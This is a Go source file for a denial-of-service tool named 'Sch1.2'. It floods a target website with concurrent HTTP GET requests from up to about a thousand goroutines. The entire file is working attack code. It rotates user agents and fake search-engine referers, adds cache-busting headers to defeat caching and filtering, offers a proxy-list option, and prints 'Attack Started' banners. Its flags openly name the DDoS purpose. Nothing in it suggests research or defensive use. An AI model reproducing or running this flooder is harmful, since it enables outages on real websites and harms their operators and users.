package main

import (
	"bufio"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
)

const __version__ = "1.2.1"

const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

const (
	callGotOk              uint8 = iota
	callExitOnErr
	callExitOnTooManyFiles
	targetComplete
)

var (
	safe            bool
	headersReferers []string = []string{
		"http://www.google.com/?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
		"http://bing.com/?q=",

	}
	headersUseragents []string
	cur              int32
	proxies          []string
)

func init() {
	headersUseragents = []string{
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169",
        "Safari/537.36",
       
	}

	// Set up logging to a file
	logFile, err := os.OpenFile("requests.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		fmt.Println("Error opening log file:", err)
		os.Exit(1)
	}
	log.SetOutput(logFile)
	log.Println("Starting attack logging...")
}

func getRandomUserAgent() string {
	return headersUseragents[rand.Intn(len(headersUseragents))]
}

func rateLimit(interval time.Duration) {
	time.Sleep(interval)
}

func main() {
	var (
		version bool
		site    string
		agents  string
		data    string
		proxy   string
		headers arrayFlags
		heta     bool

	)

	flag.BoolVar(&version, "version", false, "Made by MosesAlfred :D version 1.2")
	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
	flag.StringVar(&data, "data", "", "Data to POST. If present, Sch1.2 will use POST requests instead of GET")
	flag.StringVar(&proxy, "proxy", "", "File with list of proxy servers to use.")
	flag.Var(&headers, "header", "Add headers to the request. Can be used multiple times")
	flag.BoolVar(&heta, "heta", false, "Use this method to DDOS (Main method)")


	t := os.Getenv("SCH1MAXPROCS")
	maxproc, err := strconv.Atoi(t)
	if err != nil {
		maxproc = 1023
	}

	u, err := url.Parse(site)
	if err != nil {
		fmt.Println("Error parsing URL parameter")
		os.Exit(1)
	}

	if version {
		fmt.Println("Sch1.2", __version__)
		os.Exit(0)
	}

	if agents != "" {
		if data, err := ioutil.ReadFile(agents); err == nil {
			headersUseragents = []string{}
			for _, a := range strings.Split(string(data), "\n") {
				if strings.TrimSpace(a) == "" {
					continue
				}
				headersUseragents = append(headersUseragents, a)
			}
		} else {
			fmt.Printf("Can't load User-Agent list from %s\n", agents)
			os.Exit(1)
		}
	}

	if proxy != "" {
		file, err := os.Open(proxy)
		if err != nil {
			fmt.Println("Error opening proxy file:", err)
			os.Exit(1)
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			proxies = append(proxies, scanner.Text())
		}

		if err := scanner.Err(); err != nil {
			fmt.Println("Error reading proxy file:", err)
			os.Exit(1)
		}
	}

	go func() {
		fmt.Println("------------------------------------------------")
		fmt.Println("                                                ")
		fmt.Println("                                                ")
		fmt.Println("-- Sch1.2 Attack Started --\n            GO!!\n\n")
		fmt.Println("                                                ")
		fmt.Println("                                Made by Asher   ")
		fmt.Println("------------------------------------------------")
		ss := make(chan uint8, 8)

		var (
			err, sent int32
		)
		fmt.Println("In use               |\tResp OK |\tGot err")
		for {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				if heta {
					go heta1(site, u.Host, data, headers, ss)
				} else {
					go httpcall(site, u.Host, data, headers, ss)
				}
				
			}
			if sent%10 == 0 {
				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
			}
			switch <-ss {
			case callExitOnErr:
				atomic.AddInt32(&cur, -1)
				err++
			case callExitOnTooManyFiles:
				atomic.AddInt32(&cur, -1)
				maxproc--
			case callGotOk:
				sent++
			case targetComplete:
				sent++
				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
				fmt.Println("\r-- Sch1.2 Attack Finished --       \n\n\r")
				os.Exit(0)
			}
		}
	}()

	ctlc := make(chan os.Signal)
	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
	<-ctlc
	fmt.Println("                                                ")
	fmt.Println("\r\n-- Interrupted by user --        \n")
	fmt.Println("                                                ")
	fmt.Println("              BYE BYE <3                        ")

}


func getRandomProxy(proxies []string) string {
    if len(proxies) > 0 {
        return proxies[rand.Intn(len(proxies))]
    }
    return ""
}

func logRequestDetails(url string, userAgent string, statusCode int, retries int, err error) {

	log.Printf("Request to %s with User-Agent: %s | Status: %d | Retries: %d | Error: %v\n", url, userAgent, statusCode, retries, err)
}

func httpcall(requestURL string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)

	for {
		q, err := http.NewRequest("GET", requestURL, nil)
		if err != nil {
			logRequestDetails(requestURL, getRandomUserAgent(), 0, 0, err)
			s <- callExitOnErr
			return
		}

		q.Header.Set("User-Agent", getRandomUserAgent())
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))])

		for _, v := range headers {
			kv := strings.Split(v, ":")
			if len(kv) < 2 {
				continue
			}
			k := strings.TrimSpace(kv[0])
			v := strings.TrimSpace(kv[1])
			q.Header.Set(k, v)
		}

		for retries := 0; retries < 5; retries++ {
			resp, err := http.DefaultClient.Do(q)
			if err != nil {
				logRequestDetails(requestURL, getRandomUserAgent(), 0, retries, err)
				time.Sleep(time.Duration(1<<retries) * time.Millisecond)
				continue
			}
			defer resp.Body.Close()

			logRequestDetails(requestURL, getRandomUserAgent(), resp.StatusCode, retries, err)

			if resp.StatusCode >= 200 && resp.StatusCode < 300 {
				s <- callGotOk
			} else {
				s <- callExitOnErr
			}
			return
		}
	}
}


func heta1(requestURL string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)

	for {
		time.Sleep(10 * time.Millisecond) 
		
		q, err := http.NewRequest("GET", requestURL, nil)
		if err != nil {
			s <- callExitOnErr
			return
		}

        q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
        q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))])
        q.Header.Set("Cache-Control", "no-cache")
        q.Header.Set("Accept-Encoding", "gzip, deflate")
        q.Header.Set("Pragma", "no-cache")
        q.Header.Set("DNT", "1")
        q.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
		q.Header.Set("Accept-Encoding", "gzip, deflate, sdch")

		for _, v := range headers {
			kv := strings.Split(v, ":")
			if len(kv) < 2 {
				continue
			}
			k := strings.TrimSpace(kv[0])
			v := strings.TrimSpace(kv[1])
			q.Header.Set(k, v)
		}

		resp, err := http.DefaultClient.Do(q)
		if err != nil {
			s <- callExitOnErr
			return
		}
		defer resp.Body.Close()

		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			s <- callGotOk
		} else {
			s <- callExitOnErr
		}
	}
}




func handleInterrupt() {
	ctlc := make(chan os.Signal)
	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
	<-ctlc
	fmt.Println("\r\n-- Interrupted by user --        \n")
	os.Exit(0)
}


type arrayFlags []string

func (i *arrayFlags) String() string {
	return "arrayFlags"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}